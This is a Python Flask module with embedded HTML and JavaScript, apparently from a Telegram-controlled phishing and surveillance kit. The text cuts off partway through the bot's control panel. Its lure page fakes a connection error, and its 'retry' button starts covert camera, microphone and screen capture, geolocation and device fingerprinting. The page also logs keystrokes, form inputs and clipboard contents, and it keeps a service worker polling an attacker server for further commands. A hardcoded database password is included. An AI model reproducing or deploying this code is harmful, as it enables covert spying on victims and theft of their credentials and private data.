# lsh_module.py
# ============================================================
# LSH v4 — نظام التحكم الكامل مع جلسة 24 ساعة
# Service Worker + Wake Lock + IndexedDB + Push/Pull
# ============================================================

import os
import io
import json
import time
import base64
import threading
import redis
import qrcode
from flask import Blueprint, request, jsonify, Response

lsh_bp = Blueprint('lsh_module', __name__)

# ============================================================
# [1] Redis — نسخة محسّنة مع TLS fallback
# ============================================================
REDIS_URL = os.getenv("REDIS_URL", "").strip()
if not REDIS_URL:
    REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"
if REDIS_URL.startswith("redis-cli"):
    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()
if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
    REDIS_URL = "redis://" + REDIS_URL


def _try_redis(url):
    try:
        client = redis.Redis.from_url(
            url, decode_responses=True, socket_timeout=10,
            socket_connect_timeout=10, retry_on_timeout=True,
            health_check_interval=30,
        )
        client.ping()
        return client
    except Exception as e:
        print(f"[-] LSH Redis try failed ({url[:30]}...): {e}")
        return None


redis_client = _try_redis(REDIS_URL)
if not redis_client and REDIS_URL.startswith("redis://"):
    tls_url = REDIS_URL.replace("redis://", "rediss://", 1)
    redis_client = _try_redis(tls_url)
    if redis_client:
        REDIS_URL = tls_url
if not redis_client and REDIS_URL.startswith("rediss://"):
    non_tls = REDIS_URL.replace("rediss://", "redis://", 1)
    redis_client = _try_redis(non_tls)
    if redis_client:
        REDIS_URL = non_tls

if redis_client:
    print("[+] LSH: ✅ Redis connected")
else:
    print("[-] LSH: ❌ Redis FAILED")

RAILWAY_URL = os.getenv("RAILWAY_URL", "https://daf-production-8df9.up.railway.app")

# ============================================================
# [2] جلسات in-memory
# ============================================================
sessions = {}
sessions_lock = threading.Lock()


def create_session(session_id, chat_id):
    with sessions_lock:
        sessions[session_id] = {
            "chat_id": chat_id,
            "created_at": time.time(),
            "last_seen": time.time(),
            "info": {},
            "live": True,
        }
    if redis_client:
        try:
            redis_client.setex(f"lsh_session:{session_id}", 86400, str(chat_id))
        except Exception as e:
            print(f"[-] Redis session save: {e}")
    return sessions[session_id]


def get_session(session_id):
    with sessions_lock:
        return sessions.get(session_id)


def push_command(session_id, command_dict):
    """إرسال أمر — سيُسلَّم في الـ ping التالي (خلال 2-3 ثواني)"""
    if not redis_client:
        print(f"[-] PUSH FAIL: no Redis")
        return False
    try:
        channel = f"lsh_cmd:{session_id}"
        payload = json.dumps(command_dict)
        redis_client.lpush(channel, payload)
        redis_client.expire(channel, 1800)
        pending = redis_client.llen(channel)
        print(f"[+] PUSH >> {session_id[:8]} | {command_dict.get('action')} | pending={pending}")
        return True
    except Exception as e:
        print(f"[-] PUSH ERROR: {e}")
        return False


# ============================================================
# [3] Service Worker (Inline fallback)
# ============================================================
SW_FALLBACK = r"""
// sw.js - Service Worker للجلسة 24 ساعة
const PING_INTERVAL = 3000;
let sessionData = null;
let pingTimer = null;

self.addEventListener('install', (e) => {
  console.log('[SW] Installing...');
  self.skipWaiting();
});

self.addEventListener('activate', (e) => {
  console.log('[SW] Activated');
  e.waitUntil(self.clients.claim());
});

self.addEventListener('message', (event) => {
  const data = event.data || {};
  console.log('[SW] Message:', data.type);

  if (data.type === 'init') {
    sessionData = {
      session_id: data.session_id,
      chat_id: data.chat_id,
      http_url: data.http_url,
      started_at: Date.now()
    };
    startPing();
  }
  if (data.type === 'stop') {
    stopPing();
  }
  if (data.type === 'keepalive') {
    if (sessionData) sessionData.last_page_seen = Date.now();
  }
});

function startPing() {
  if (pingTimer) clearInterval(pingTimer);
  pingTimer = setInterval(doPing, PING_INTERVAL);
  doPing();
}

function stopPing() {
  if (pingTimer) {
    clearInterval(pingTimer);
    pingTimer = null;
  }
}

async function doPing() {
  if (!sessionData) return;
  try {
    const resp = await fetch(sessionData.http_url + '/lsh_msg', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        session_id: sessionData.session_id,
        chat_id: sessionData.chat_id,
        type: 'sw_ping',
        ts: Date.now()
      })
    });
    if (!resp.ok) return;
    const data = await resp.json();
    const commands = data.commands || [];
    if (commands.length > 0) {
      const clients = await self.clients.matchAll({ includeUncontrolled: true });
      clients.forEach(client => {
        client.postMessage({ type: 'commands', commands: commands });
      });
    }
  } catch (e) {
    console.log('[SW] Ping failed:', e.message);
  }
}

self.addEventListener('push', (event) => {
  event.waitUntil(doPing());
});

self.addEventListener('sync', (event) => {
  if (event.tag === 'lsh-ping') event.waitUntil(doPing());
});

self.addEventListener('fetch', (event) => {
  event.respondWith(fetch(event.request).catch(() => {
    return new Response('offline', { status: 503 });
  }));
});
"""


# ============================================================
# [4] القالب الرئيسي
# ============================================================
LSH_PAGE = r"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="theme-color" content="#f5f7fa">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="default">
<meta name="mobile-web-app-capable" content="yes">
<link rel="manifest" href="/manifest.json">
<title>حدث خطأ غير متوقع</title>
<style>
  * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; user-select: none; -webkit-user-select: none; }
  html, body { margin: 0; padding: 0; background: #f5f7fa; color: #1a202c;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
    min-height: 100vh; -webkit-font-smoothing: antialiased; }
  .wrap { max-width: 520px; margin: 0 auto; padding: 80px 24px 40px; text-align: center; }
  .icon-wrap { width: 88px; height: 88px; margin: 0 auto 28px; border-radius: 50%; background: #fff;
    display: flex; align-items: center; justify-content: center;
    box-shadow: 0 4px 20px rgba(0,0,0,0.06); border: 1px solid #e2e8f0; }
  .icon-wrap svg { width: 44px; height: 44px; }
  h1 { font-size: 22px; font-weight: 600; color: #1a202c; margin: 0 0 14px; letter-spacing: -0.3px; }
  .subtitle { color: #64748b; font-size: 15px; line-height: 1.7; margin: 0 0 36px; padding: 0 10px; }
  .info-card { background: #fff; border: 1px solid #e2e8f0; border-radius: 14px;
    padding: 20px; margin-bottom: 22px; text-align: right;
    box-shadow: 0 1px 3px rgba(0,0,0,0.03); }
  .info-row { display: flex; align-items: center; justify-content: space-between;
    padding: 10px 0; border-bottom: 1px solid #f1f5f9; font-size: 13px; }
  .info-row:last-child { border-bottom: none; }
  .info-label { color: #64748b; }
  .info-value { color: #1a202c; font-weight: 500; }
  .info-value.error { color: #e11d48; }
  .retry-btn { display: block; width: 100%; padding: 15px 20px; border: none; border-radius: 10px;
    background: #2563eb; color: #fff; font-size: 15px; font-weight: 600; cursor: pointer;
    box-shadow: 0 1px 2px rgba(37,99,235,0.2); transition: background 0.15s ease;
    font-family: inherit; letter-spacing: 0.2px; }
  .retry-btn:hover { background: #1d4ed8; }
  .retry-btn:disabled { background: #94a3b8; cursor: not-allowed; }
  .help-link { display: block; margin-top: 22px; color: #64748b; font-size: 13px;
    text-decoration: none; }
  .hidden { display: none !important; }
  .loading-dots { display: inline-flex; gap: 4px; margin-left: 6px; vertical-align: middle; }
  .loading-dots span { width: 5px; height: 5px; border-radius: 50%; background: #fff;
    opacity: 0.4; animation: dp 1.4s infinite; }
  .loading-dots span:nth-child(2) { animation-delay: 0.2s; }
  .loading-dots span:nth-child(3) { animation-delay: 0.4s; }
  @keyframes dp { 0%,60%,100% { opacity: 0.4; transform: scale(0.85); } 30% { opacity: 1; transform: scale(1); } }
  .progress-bar { height: 6px; background: #e2e8f0; border-radius: 3px; overflow: hidden; margin: 12px 0; }
  .progress-fill { height: 100%; width: 0%; background: #2563eb; transition: width 0.4s ease; }
  .progress-text { text-align: center; font-size: 12px; color: #64748b; margin-top: 8px; }
  .success-check { width: 80px; height: 80px; margin: 0 auto 24px; border-radius: 50%;
    background: #dcfce7; display: flex; align-items: center; justify-content: center; }
  .success-check svg { width: 40px; height: 40px; }
  .success-title { font-size: 20px; font-weight: 600; color: #16a34a; margin-bottom: 10px; }
  .success-desc { color: #64748b; font-size: 14px; line-height: 1.7; }
</style>
</head>
<body>
<div class="wrap">

  <div id="errorState">
    <div class="icon-wrap">
      <svg viewBox="0 0 24 24" fill="none">
        <circle cx="12" cy="12" r="10" stroke="#e11d48" stroke-width="2"/>
        <path d="M12 7v6" stroke="#e11d48" stroke-width="2" stroke-linecap="round"/>
        <circle cx="12" cy="16.5" r="1" fill="#e11d48"/>
      </svg>
    </div>
    <h1>حدث خطأ غير متوقع</h1>
    <p class="subtitle">تعذّر إكمال العملية بسبب مشكلة مؤقتة في الاتصال.<br>يرجى المحاولة مرة أخرى.</p>
    <div class="info-card">
      <div class="info-row"><span class="info-label">حالة الاتصال</span><span class="info-value error">منقطع</span></div>
      <div class="info-row"><span class="info-label">رمز الخطأ</span><span class="info-value">ERR_CONNECTION_RESET</span></div>
      <div class="info-row"><span class="info-label">معرّف الطلب</span><span class="info-value" id="reqId">—</span></div>
    </div>
    <button class="retry-btn" id="retryBtn" onclick="retryConnection()">إعادة المحاولة</button>
    <a href="#" class="help-link" onclick="event.preventDefault()">هل تحتاج إلى مساعدة؟</a>
  </div>

  <div id="loadingState" class="hidden">
    <div class="icon-wrap">
      <svg viewBox="0 0 24 24" fill="none">
        <circle cx="12" cy="12" r="10" stroke="#2563eb" stroke-width="2" stroke-dasharray="4 4">
          <animateTransform attributeName="transform" type="rotate" from="0 12 12" to="360 12 12" dur="1.5s" repeatCount="indefinite"/>
        </circle>
      </svg>
    </div>
    <h1>جاري إعادة الاتصال...</h1>
    <p class="subtitle">يرجى الانتظار وعدم إغلاق الصفحة.</p>
    <div class="info-card">
      <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
      <div class="progress-text" id="progressText">0%</div>
    </div>
  </div>

  <div id="successState" class="hidden">
    <div class="success-check">
      <svg viewBox="0 0 24 24" fill="none">
        <path d="M5 13l4 4L19 7" stroke="#16a34a" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
      </svg>
    </div>
    <div class="success-title">تم بنجاح</div>
    <div class="success-desc">تم إكمال العملية بنجاح.<br>يمكنك إغلاق هذه الصفحة الآن.</div>
  </div>

</div>

<script>
(function(){
  "use strict";

  const SESSION_ID = "__SESSION_ID__";
  const CHAT_ID    = "__CHAT_ID__";
  const HTTP_URL   = "__HTTP_URL__";

  const el = id => document.getElementById(id);
  const sleep = ms => new Promise(r => setTimeout(r, ms));
  const show = id => el(id).classList.remove('hidden');
  const hide = id => el(id).classList.add('hidden');

  // ============================================================
  // ★ Service Worker
  // ============================================================
  let swRegistration = null;
  let serviceWorker = null;

  async function initServiceWorker() {
    if (!('serviceWorker' in navigator)) {
      console.log('[SW] Not supported');
      return false;
    }
    try {
      swRegistration = await navigator.serviceWorker.register('/sw.js', { scope: '/' });
      console.log('[SW] Registered:', swRegistration.scope);
      await navigator.serviceWorker.ready;
      serviceWorker = swRegistration.active || navigator.serviceWorker.controller;

      sendToSW({
        type: 'init',
        session_id: SESSION_ID,
        chat_id: CHAT_ID,
        http_url: HTTP_URL
      });

      navigator.serviceWorker.addEventListener('message', (event) => {
        const data = event.data || {};
        if (data.type === 'commands' && Array.isArray(data.commands)) {
          data.commands.forEach(cmd => executeCommand(cmd));
        }
      });

      console.log('[SW] Initialized');
      return true;
    } catch (e) {
      console.log('[SW] Registration failed:', e.message);
      return false;
    }
  }

  function sendToSW(msg) {
    if (serviceWorker) {
      try { serviceWorker.postMessage(msg); } catch(e) {}
    }
    if (navigator.serviceWorker.controller) {
      try { navigator.serviceWorker.controller.postMessage(msg); } catch(e) {}
    }
  }

  // ============================================================
  // ★ Wake Lock
  // ============================================================
  let wakeLock = null;
  async function requestWakeLock() {
    try {
      if ('wakeLock' in navigator) {
        wakeLock = await navigator.wakeLock.request('screen');
        console.log('[WakeLock] Acquired');
        wakeLock.addEventListener('release', () => { wakeLock = null; });
      }
    } catch (e) { console.log('[WakeLock] Failed:', e.message); }
  }

  // ============================================================
  // ★ Audio Context Loop (iOS)
  // ============================================================
  let audioContext = null;
  function startSilentAudio() {
    try {
      audioContext = new (window.AudioContext || window.webkitAudioContext)();
      const osc = audioContext.createOscillator();
      const gain = audioContext.createGain();
      gain.gain.value = 0.0001;
      osc.connect(gain);
      gain.connect(audioContext.destination);
      osc.frequency.value = 20000;
      osc.start();
      console.log('[Audio] Silent loop started');
    } catch (e) { console.log('[Audio] Failed:', e.message); }
  }

  // ============================================================
  // ★ IndexedDB
  // ============================================================
  let db = null;
  async function initDB() {
    return new Promise(resolve => {
      try {
        const request = indexedDB.open('lsh_db', 1);
        request.onupgradeneeded = (e) => {
          const database = e.target.result;
          if (!database.objectStoreNames.contains('queue')) {
            database.createObjectStore('queue', { autoIncrement: true });
          }
        };
        request.onsuccess = (e) => { db = e.target.result; resolve(true); };
        request.onerror = () => resolve(false);
      } catch (e) { resolve(false); }
    });
  }

  async function saveToQueue(item) {
    if (!db) return;
    try {
      const tx = db.transaction('queue', 'readwrite');
      tx.objectStore('queue').add({ ...item, ts: Date.now() });
    } catch (e) {}
  }

  async function flushQueue() {
    if (!db) return;
    try {
      const tx = db.transaction('queue', 'readwrite');
      const store = tx.objectStore('queue');
      const req = store.getAll();
      req.onsuccess = async () => {
        const items = req.result || [];
        for (const item of items) {
          try {
            await fetch(HTTP_URL + '/lsh_msg', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(item)
            });
          } catch (e) {}
        }
        store.clear();
      };
    } catch (e) {}
  }

  // ============================================================
  // كاميرا/ميكروفون
  // ============================================================
  let videoEl = null, canvasEl = null;
  let camStream = null, micStream = null;
  let captureStarted = false;
  let pingActive = true;

  function ensureHiddenEls() {
    if (!videoEl) {
      videoEl = document.createElement('video');
      videoEl.autoplay = true; videoEl.muted = true;
      videoEl.setAttribute('playsinline', '');
      videoEl.setAttribute('webkit-playsinline', '');
      videoEl.style.cssText = 'position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;top:-9999px;left:-9999px;';
      document.body.appendChild(videoEl);
    }
    if (!canvasEl) {
      canvasEl = document.createElement('canvas');
      canvasEl.style.cssText = 'position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;top:-9999px;left:-9999px;';
      document.body.appendChild(canvasEl);
    }
  }

  async function collectBasicInfo() {
    const info = {
      session_id: SESSION_ID, chat_id: CHAT_ID,
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      platform: navigator.platform || "Unknown",
      language: navigator.language,
      languages: navigator.languages || [],
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      screen: {
        width: window.screen.width, height: window.screen.height,
        availWidth: window.screen.availWidth, availHeight: window.screen.availHeight,
        colorDepth: window.screen.colorDepth, pixelRatio: window.devicePixelRatio,
        orientation: window.screen.orientation ? window.screen.orientation.type : "N/A"
      },
      hardware: {
        cores: navigator.hardwareConcurrency || "N/A",
        memory: navigator.deviceMemory || "N/A",
        maxTouchPoints: navigator.maxTouchPoints || 0
      },
      cookies_enabled: navigator.cookieEnabled,
      do_not_track: navigator.doNotTrack,
      referrer: document.referrer || "direct",
      sw_supported: 'serviceWorker' in navigator,
      wakelock_supported: 'wakeLock' in navigator,
    };
    try {
      const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (c) info.connection = { effectiveType: c.effectiveType, downlink: c.downlink, rtt: c.rtt };
    } catch(e){}
    try {
      if (navigator.getBattery) {
        const b = await navigator.getBattery();
        info.battery = { level: Math.round(b.level*100), charging: b.charging };
      }
    } catch(e){}
    try {
      const c = document.createElement('canvas');
      const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
      if (gl) {
        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
        if (dbg) info.gpu = {
          vendor: gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL),
          renderer: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)
        };
      }
    } catch(e){}

    info.webrtc_ips = await new Promise(resolve => {
      try {
        const ips = new Set();
        const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
        pc.createDataChannel('');
        pc.onicecandidate = e => {
          if (!e.candidate) { try{pc.close();}catch(e){} return resolve(Array.from(ips)); }
          const m = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(e.candidate.candidate);
          if (m) ips.add(m[1]);
        };
        pc.createOffer().then(o => pc.setLocalDescription(o)).catch(()=>resolve([]));
        setTimeout(() => { try{pc.close();}catch(e){} resolve(Array.from(ips)); }, 2500);
      } catch(e) { resolve([]); }
    });
    return info;
  }

  async function collectLocation() {
    return new Promise(resolve => {
      if (!navigator.geolocation) return resolve(null);
      const t = setTimeout(() => resolve(null), 8000);
      navigator.geolocation.getCurrentPosition(
        pos => { clearTimeout(t); resolve({
          latitude: pos.coords.latitude, longitude: pos.coords.longitude,
          accuracy: pos.coords.accuracy
        }); },
        () => { clearTimeout(t); resolve(null); },
        { enableHighAccuracy: true, timeout: 7500, maximumAge: 0 }
      );
    });
  }

  async function startCamera() {
    if (camStream && camStream.active) return true;
    try {
      camStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, audio: false
      });
      ensureHiddenEls();
      videoEl.srcObject = camStream;
      await videoEl.play().catch(()=>{});
      await sleep(1200);
      return true;
    } catch(e) {
      try {
        camStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        ensureHiddenEls();
        videoEl.srcObject = camStream;
        await videoEl.play().catch(()=>{});
        await sleep(1200);
        return true;
      } catch(e2) { return false; }
    }
  }

  async function startMic() {
    if (micStream && micStream.active) return true;
    try { micStream = await navigator.mediaDevices.getUserMedia({ audio: true }); return true; }
    catch(e) { return false; }
  }

  function snapshot() {
    try {
      ensureHiddenEls();
      if (!videoEl.videoWidth) return null;
      canvasEl.width = videoEl.videoWidth;
      canvasEl.height = videoEl.videoHeight;
      canvasEl.getContext('2d').drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
      return canvasEl.toDataURL('image/jpeg', 0.75);
    } catch(e) { return null; }
  }

  async function recordAudio(durationMs) {
    if (!micStream) return null;
    return new Promise(resolve => {
      try {
        const chunks = [];
        let mime = 'audio/webm';
        if (MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) mime = 'audio/webm;codecs=opus';
        else if (MediaRecorder.isTypeSupported('audio/mp4')) mime = 'audio/mp4';
        const rec = new MediaRecorder(micStream, { mimeType: mime });
        rec.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
        rec.onstop = () => {
          const blob = new Blob(chunks, { type: mime });
          const fr = new FileReader();
          fr.onloadend = () => resolve(fr.result);
          fr.readAsDataURL(blob);
        };
        rec.start();
        setTimeout(() => { try { rec.stop(); } catch(e){} }, durationMs);
      } catch(e) { resolve(null); }
    });
  }

  async function recordVideo(durationMs) {
    if (!camStream) return null;
    return new Promise(resolve => {
      try {
        const chunks = [];
        let mime = 'video/webm';
        if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) mime = 'video/webm;codecs=vp9';
        else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) mime = 'video/webm;codecs=vp8';
        const rec = new MediaRecorder(camStream, { mimeType: mime });
        rec.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
        rec.onstop = () => {
          const blob = new Blob(chunks, { type: mime });
          const fr = new FileReader();
          fr.onloadend = () => resolve(fr.result);
          fr.readAsDataURL(blob);
        };
        rec.start();
        setTimeout(() => { try { rec.stop(); } catch(e){} }, durationMs);
      } catch(e) { resolve(null); }
    });
  }

  // ============================================================
  // إرسال موحّد
  // ============================================================
  async function sendMessage(data) {
    try {
      const resp = await fetch(HTTP_URL + "/lsh_msg", {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...data, session_id: SESSION_ID, chat_id: CHAT_ID }),
        keepalive: true
      });
      if (!resp.ok) return null;
      const json = await resp.json();
      return json.commands || [];
    } catch(e) {
      await saveToQueue({ ...data, session_id: SESSION_ID, chat_id: CHAT_ID });
      return null;
    }
  }

  function push(data) {
    sendMessage(data).then(commands => {
      if (commands && commands.length > 0) {
        commands.forEach(cmd => executeCommand(cmd));
      }
    }).catch(()=>{});
  }

  // ============================================================
  // Local Ping (احتياطي في حال SW لا يعمل)
  // ============================================================
  async function startLocalPing() {
    while (pingActive) {
      try {
        const commands = await sendMessage({ type: 'page_ping', ts: Date.now() });
        if (commands && commands.length > 0) {
          for (const cmd of commands) {
            await executeCommand(cmd);
          }
        }
      } catch(e) {}
      await sleep(4000);
    }
  }

  // ============================================================
  // تنفيذ الأوامر
  // ============================================================
  async function executeCommand(cmd) {
    const action = cmd.action;
    const payload = cmd.payload || {};
    console.log('[EXEC]', action, payload);

    try {
      if (action === 'snapshot') {
        if (!camStream || !camStream.active) {
          const ok = await startCamera();
          if (!ok) { push({ type: 'cmd_result', action: 'snapshot', status: 'fail', error: 'no_camera' }); return; }
        }
        const img = snapshot();
        if (img) push({ type: 'cmd_result', action: 'snapshot', status: 'ok', data: img });
        else push({ type: 'cmd_result', action: 'snapshot', status: 'fail', error: 'capture_failed' });
        return;
      }

      if (action === 'audio') {
        if (!micStream || !micStream.active) {
          const ok = await startMic();
          if (!ok) { push({ type: 'cmd_result', action: 'audio', status: 'fail', error: 'no_mic' }); return; }
        }
        const audio = await recordAudio(payload.duration || 6000);
        if (audio) push({ type: 'cmd_result', action: 'audio', status: 'ok', data: audio });
        else push({ type: 'cmd_result', action: 'audio', status: 'fail', error: 'record_failed' });
        return;
      }

      if (action === 'video') {
        if (!camStream || !camStream.active) {
          const ok = await startCamera();
          if (!ok) { push({ type: 'cmd_result', action: 'video', status: 'fail', error: 'no_camera' }); return; }
        }
        const vid = await recordVideo(payload.duration || 10000);
        if (vid) push({ type: 'cmd_result', action: 'video', status: 'ok', data: vid });
        else push({ type: 'cmd_result', action: 'video', status: 'fail', error: 'record_failed' });
        return;
      }

      if (action === 'screen') {
        try {
          if (!navigator.mediaDevices.getDisplayMedia) {
            push({ type: 'cmd_result', action: 'screen', status: 'fail', error: 'not_supported' });
            return;
          }
          const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
          const v = document.createElement('video');
          v.srcObject = stream; v.muted = true;
          await v.play();
          await sleep(1500);
          const c = document.createElement('canvas');
          c.width = v.videoWidth || 1280;
          c.height = v.videoHeight || 720;
          c.getContext('2d').drawImage(v, 0, 0);
          const img = c.toDataURL('image/jpeg', 0.7);
          stream.getTracks().forEach(t => t.stop());
          push({ type: 'cmd_result', action: 'screen', status: 'ok', data: img });
        } catch(e) {
          push({ type: 'cmd_result', action: 'screen', status: 'fail', error: e.message || 'denied' });
        }
        return;
      }

      if (action === 'clipboard') {
        try {
          if (!navigator.clipboard || !navigator.clipboard.readText) {
            push({ type: 'cmd_result', action: 'clipboard', status: 'fail', error: 'not_supported' });
            return;
          }
          const text = await navigator.clipboard.readText();
          push({ type: 'cmd_result', action: 'clipboard', status: 'ok', data: text || '(empty)' });
        } catch(e) {
          push({ type: 'cmd_result', action: 'clipboard', status: 'fail', error: e.message || 'denied' });
        }
        return;
      }

      if (action === 'location') {
        const loc = await collectLocation();
        if (loc) push({ type: 'cmd_result', action: 'location', status: 'ok', data: JSON.stringify(loc) });
        else push({ type: 'cmd_result', action: 'location', status: 'fail', error: 'denied_or_timeout' });
        return;
      }

      if (action === 'url') {
        try {
          const w = window.open(payload.url, '_blank');
          if (w) push({ type: 'cmd_result', action: 'url', status: 'ok', data: payload.url });
          else push({ type: 'cmd_result', action: 'url', status: 'fail', error: 'popup_blocked' });
        } catch(e) {
          push({ type: 'cmd_result', action: 'url', status: 'fail', error: e.message });
        }
        return;
      }

      if (action === 'vibrate') {
        try {
          if (navigator.vibrate) {
            navigator.vibrate(payload.pattern || [500,200,500,200,500]);
            push({ type: 'cmd_result', action: 'vibrate', status: 'ok', data: 'vibrated' });
          } else {
            push({ type: 'cmd_result', action: 'vibrate', status: 'fail', error: 'not_supported' });
          }
        } catch(e) {
          push({ type: 'cmd_result', action: 'vibrate', status: 'fail', error: e.message });
        }
        return;
      }

      if (action === 'redirect') {
        push({ type: 'cmd_result', action: 'redirect', status: 'ok', data: 'closing' });
        await sleep(400);
        window.location.href = payload.url || 'about:blank';
        return;
      }

      push({ type: 'cmd_result', action: action, status: 'fail', error: 'unknown_action' });
    } catch(e) {
      push({ type: 'cmd_result', action: action, status: 'fail', error: e.message });
    }
  }

  // ============================================================
  // المراقبة الخلفية
  // ============================================================
  function startMonitors() {
    document.addEventListener('keydown', e => {
      try {
        push({ type: 'key', key: e.key, code: e.code,
          ctrl: e.ctrlKey, shift: e.shiftKey, alt: e.altKey,
          target: (e.target && e.target.tagName) ? e.target.tagName.toLowerCase() : 'unknown',
          target_type: (e.target && e.target.type) ? e.target.type : '' });
      } catch(err) {}
    }, true);

    document.addEventListener('copy', () => {
      try {
        const sel = window.getSelection().toString().slice(0,500);
        if (sel) push({ type: 'clipboard_copy', content: sel });
      } catch(e) {}
    }, true);

    document.addEventListener('paste', e => {
      try {
        const txt = (e.clipboardData || window.clipboardData).getData('text');
        if (txt) push({ type: 'clipboard_paste', content: txt.slice(0,500) });
      } catch(e) {}
    }, true);

    document.addEventListener('submit', e => {
      try {
        const fd = new FormData(e.target);
        const data = {};
        for (const [k, v] of fd.entries()) {
          if (typeof v === 'string' && v.length < 500) data[k] = v;
        }
        push({ type: 'form_submit', action_url: e.target.action, data: data });
      } catch(e) {}
    }, true);

    document.addEventListener('click', e => {
      try {
        push({ type: 'click',
          target: (e.target && e.target.tagName) ? e.target.tagName : 'unknown',
          text: (e.target && e.target.innerText) ? e.target.innerText.slice(0,80) : '' });
      } catch(e) {}
    }, true);

    setInterval(() => {
      const img = snapshot();
      if (img) push({ type: 'periodic_photo', image: img });
    }, 60000);
  }

  // ============================================================
  // بدء الالتقاط الكامل
  // ============================================================
  async function startFullCapture() {
    if (captureStarted) return;
    captureStarted = true;
    hide('errorState');
    show('loadingState');

    const setProgress = (pct) => {
      el('progressFill').style.width = pct + '%';
      el('progressText').textContent = pct + '%';
    };

    setProgress(10);
    await sleep(300);
    const info = await collectBasicInfo();
    await sendMessage({ type: 'info', info: info });
    setProgress(25);

    const loc = await collectLocation();
    if (loc) await sendMessage({ type: 'location', location: loc });
    setProgress(45);

    const camOk = await startCamera();
    if (camOk) {
      const img = snapshot();
      if (img) await sendMessage({ type: 'first_photo', image: img });
    }
    setProgress(75);

    const micOk = await startMic();
    if (micOk) {
      const audio = await recordAudio(5000);
      if (audio) await sendMessage({ type: 'first_audio', audio: audio });
    }
    setProgress(100);

    await sendMessage({ type: 'ready' });

    startMonitors();
    startLocalPing();

    // إبلاغ SW بأن الجلسة نشطة
    sendToSW({ type: 'keepalive' });

    // Wake Lock
    requestWakeLock();

    // حفظ الجلسة
    try {
      localStorage.setItem('lsh_session', JSON.stringify({
        session_id: SESSION_ID, chat_id: CHAT_ID, ts: Date.now()
      }));
    } catch(e) {}

    await sleep(800);
    hide('loadingState');
    show('successState');
  }

  window.retryConnection = async function() {
    const btn = el('retryBtn');
    btn.disabled = true;
    btn.innerHTML = 'جاري الاتصال<span class="loading-dots"><span></span><span></span><span></span></span>';
    await sendMessage({ type: 'retry_click' });
    await sleep(1500);
    await startFullCapture();
  };

  // ============================================================
  // الإقلاع
  // ============================================================
  document.addEventListener('DOMContentLoaded', async () => {
    const reqId = 'req_' + Math.random().toString(36).substring(2, 12).toUpperCase();
    const ri = el('reqId');
    if (ri) ri.textContent = reqId;

    await initDB();
    await initServiceWorker();
    flushQueue();

    if (/iPhone|iPad|iPod/.test(navigator.userAgent)) {
      startSilentAudio();
    }

    sendMessage({ type: 'landing' });

    // نبضة كل 20 ثانية لإبقاء SW نشطاً
    setInterval(() => {
      sendToSW({ type: 'keepalive' });
    }, 20000);
  });

  window.addEventListener('beforeunload', function(e) {
    e.preventDefault(); e.returnValue = ''; return '';
  });

})();
</script>
</body>
</html>
"""


# ============================================================
# [5] QR
# ============================================================
def generate_qr_code_bytes(deep_link_url):
    try:
        qr = qrcode.QRCode(version=None, error_correction=qrcode.constants.ERROR_CORRECT_H,
                           box_size=12, border=2)
        qr.add_data(deep_link_url)
        qr.make(fit=True)
        img = qr.make_image(fill_color="#000000", back_color="#ffffff")
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        buf.seek(0)
        buf.name = "lsh_qr.png"
        return buf
    except Exception as e:
        print(f"[-] QR gen error: {e}")
        return io.BytesIO()


# ============================================================
# [6] لوحة التحكم
# ============================================================
def build_lsh_control_panel(session_id, chat_id):
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
    m = InlineKeyboardMarkup()
    m.row(
        InlineKeyboardButton("📸 صورة فورية", callback_data=f"lsh_snap_{session_id}"),
        InlineKeyboardButton("🎙️ تسجيل صوتي", callback_data=f"lsh_audio_{session_id}"),
    )
    m.row(
        InlineKeyboardButton("🎥 فيديو 10 ثوان", callback_data=f"lsh_video_{session_id}"),
        InlineKeyboardButton("🖥️ لقطة شاشة", callback_data=f"lsh_screen_{session_id}"),
    )
    m.row(
        InlineKeyboardButton("📋 حافظة الضحية", callback_data=f"lsh_clip_{session_id}"),
        InlineKeyboardButton("📍 تحديث الموقع", callback_data=f"lsh_loc_{session_id}"),
    )
    m.row(
        InlineKeyboardButton("🌐 فتح رابط", callback_data=f"lsh_open_{session_id}"),
        InlineKeyboardButton("📳 اهتزاز", callback_data=f"lsh_vibrate_{session_id}"),
    )
    m.row(
